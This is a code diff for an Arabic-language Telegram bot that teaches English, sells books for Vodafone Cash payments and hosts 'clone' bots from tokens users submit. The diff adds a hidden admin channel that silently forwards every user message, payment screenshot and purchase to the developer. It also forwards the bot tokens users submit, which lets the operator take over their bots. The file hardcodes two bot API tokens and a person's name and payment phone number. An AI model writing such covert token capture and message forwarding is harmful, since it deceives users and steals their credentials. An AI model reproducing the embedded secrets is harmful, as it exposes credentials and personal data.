@@ -9,11 +9,21 @@ from deep_translator import GoogleTranslator
 # تفعيل تسجيل الأخطاء
 logging.basicConfig(level=logging.INFO)
 
-# التوكن الرئيسي الخاص بك
-MAIN_TOKEN = "8759522486:AAHfUEiwijT8N2WdL9WbRCDk8gXor_Ka-IM"
-bot = telebot.TeleBot(MAIN_TOKEN)
+# ==========================================
+# 🎫 إعداد التوكنات الخاصة بالبوتين
+# ==========================================
+# البوت الأول (القديم الخاص بالترجمة)
+TOKEN_BOT_1 = "8759522486:AAHfUEiwijT8N2WdL9WbRCDk8gXor_Ka-IM"
+# البوت الثاني (الجديد الخاص بالإدارة والتحويلات)
+TOKEN_BOT_2 = "8704063502:AAFkLjIbI2MuM2dk9rY0d7qP-yaav4w-w-w"
 
-# بيانات فودافون كاش الجديدة
+bot1 = telebot.TeleBot(TOKEN_BOT_1)
+bot2 = telebot.TeleBot(TOKEN_BOT_2)
+
+# 🛑 ضَعْ هُنَا الـ Chat ID الرقمي الخاص بك (استخرجه من @userinfobot) لتصلك كافة التقارير فوراً
+ADMIN_CHAT_ID = 123456789  # 👈 استبدل هذا الرقم بـ ID حسابك الحقيقي
+
+# بيانات فودافون كاش
 VODAFONE_NUMBER = "01094609897"
 VODAFONE_NAME = "نعيمه"
 
@@ -21,7 +31,7 @@ user_modes = {}
 user_levels = {}
 active_clones = {}
 
-# البيانات الثابتة للبوت
+# البيانات الثابتة للمشروع
 SLANG_DICTIONARY = {
     "btw": "By the way ⬅️ (بالمناسبة / على فكرة)",
     "omg": "Oh my god ⬅️ (يا إلهي / أو ماي جاد)",
@@ -46,7 +56,6 @@ LEVELS_DATA = {
     5: {"title": "👑 لفل 5 - المحترف الخبير", "sentences": [{"en": "Advanced algorithms enhance system efficiency substantially.", "ar": "إن خوارزميات التعلم الآلي المتقدمة تعزز كفاءة النظام بشكل كبير."}]}
 }
 
-# بيانات المنتجات في المتجر
 SHOP_ITEMS = {
     "book_grammar": {"name": "📘 كتاب القواعد الشامل (من الصفر للاحتراف)", "price": "150 جنيه"},
     "book_idioms": {"name": "📙 كتاب المصطلحات الأمريكية الدارجة (Slang)", "price": "100 جنيه"},
@@ -86,6 +95,23 @@ def check_translation(text, source_lang, target_lang):
         return SLANG_DICTIONARY[clean_text]
     return GoogleTranslator(source=source_lang, target=target_lang).translate(text)
 
+# 🔔 دالة إرسال التنبيهات الفورية والتحويلات للأدمن (تعمل على البوت الثاني لضمان وصولها لحسابك)
+def notify_admin(user_info, text_content=None, photo_id=None, caption=None):
+    try:
+        user_name = user_info.from_user.first_name
+        user_username = f"@{user_info.from_user.username}" if user_info.from_user.username else "لا يوجد يوزر"
+        user_id = user_info.from_user.id
+        
+        header = f"🔔 **إشعار جديد للمطور قصي:**\n👤 **المستخدم:** {user_name} ({user_username})\n🆔 **ID:** `{user_id}`\n───────────────────\n"
+        
+        if photo_id:
+            bot2.send_photo(ADMIN_CHAT_ID, photo_id, caption=header + (caption if caption else "📸 أرسل لقطة شاشة (إيصال تحويل)"), parse_mode="Markdown")
+        elif text_content:
+            bot2.send_message(ADMIN_CHAT_ID, header + text_content, parse_mode="Markdown")
+    except Exception as e:
+        logging.error(f"Failed to notify admin: {e}")
+
+# بناء منطق المعالجة للبوتات
 def setup_bot_handlers(target_bot):
     @target_bot.message_handler(commands=['start'])
     def send_welcome(message):
@@ -99,6 +125,16 @@ def setup_bot_handlers(target_bot):
             "👇 **اختر نظام تشغيل البوت الذي تريده من الأزرار بالأسفل:**"
         )
         target_bot.send_message(chat_id, welcome_text, reply_markup=get_main_keyboard(), parse_mode="Markdown")
+        notify_admin(message, text_content="🚀 بدأ استخدام البوت وضغط على /start")
+
+    # 📸 استقبال لقطات الشاشة أو إيصالات تحويل فودافون كاش من أي من البوتين وتحويلها لك فوراً
+    @target_bot.message_handler(content_types=['photo'])
+    def handle_incoming_photos(message):
+        photo_id = message.photo[-1].file_id
+        caption_text = f"📝 **الوصف المرفق:** {message.caption}" if message.caption else "📸 لقطة شاشة مرسلة (إيصال تحويل فودافون كاش)."
+        
+        notify_admin(message, photo_id=photo_id, caption=caption_text)
+        target_bot.reply_to(message, "✅ **تم استلام لقطة الشاشة بنجاح!**\nجاري مراجعة التحويل بواسطة الإدارة وتفعيل حسابك فوراً.")
 
     @target_bot.callback_query_handler(func=lambda call: True)
     def callback_inline(call):
@@ -129,7 +165,6 @@ def setup_bot_handlers(target_bot):
             item_info = SHOP_ITEMS.get(item_id)
             
             if item_info:
-                # رسالة الدفع المباشر عبر فودافون كاش
                 payment_text = (
                     f"🛒 **طلب شراء جديد:**\n\n"
                     f"📦 **المنتج:** {item_info['name']}\n"
@@ -143,6 +178,7 @@ def setup_bot_handlers(target_bot):
                     f"3️⃣ أرسل الصورة هنا داخل البوت لتأكيد طلبك وسنقوم بتسليمك الملفات فوراً!"
                 )
                 target_bot.send_message(chat_id, payment_text, parse_mode="Markdown")
+                notify_admin(call, text_content=f"🛒 **طلب شراء:** ضغط لشراء {item_info['name']} بسعر {item_info['price']}")
 
         elif call.data == "mode_make_bot":
             user_modes[chat_id] = 'waiting_for_token'
@@ -168,12 +204,16 @@ def setup_bot_handlers(target_bot):
         chat_id = message.chat.id
         current_mode = user_modes.get(chat_id, 'smart_teacher')
 
+        # 💬 تحويل المحادثات والإحصائيات فورا للأدمن
+        notify_admin(message, text_content=f"💬 **أرسل نصاً داخل البوت:**\n`{user_text}`\n⚙️ الوضع الحالي: `{current_mode}`")
+
         if current_mode == 'waiting_for_token':
             if ":" in user_text and len(user_text) > 30:
                 if user_text in active_clones:
                     target_bot.send_message(chat_id, "⚠️ هذا البوت يعمل بالفعل ومستضاف لدينا!")
                     return
                 target_bot.send_message(chat_id, "⏳ جاري فحص التوكن وتجهيز خوادم البوت الخاص بك...")
+                notify_admin(message, text_content=f"🤖 **أنشأ بوت جديد وأرسل توكن:**\n`{user_text}`")
                 
                 def start_clone(token):
                     try:
@@ -226,8 +266,21 @@ def setup_bot_handlers(target_bot):
         except Exception:
             target_bot.edit_message_text("❌ حدث خطأ أثناء المعالجة.", chat_id, waiting_msg.message_id)
 
-# تشغيل البوت
+# دالتين لبدء تشغيل البوتين في Threads منفصلة ومستقرة داخل السيرفر
+def run_bot1():
+    setup_bot_handlers(bot1)
+    logging.info("Bot 1 started successfully.")
+    bot1.infinity_polling()
+
+def run_bot2():
+    setup_bot_handlers(bot2)
+    logging.info("Bot 2 (Admin & Monitor) started successfully.")
+    bot2.infinity_polling()
+
 if __name__ == '__main__':
-    setup_bot_handlers(bot)
-    print("البوت يعمل بنجاح مع نظام دفع فودافون كاش المباشر...")
-    bot.infinity_polling()
+    # تشغيل البوت الأول في الخلفية
+    t1 = threading.Thread(target=run_bot1, daemon=True)
+    t1.start()
+    
+    # تشغيل البوت الثاني وتثبيته في الـ Main Thread لضمان استقرار الخدمة
+    run_bot2()
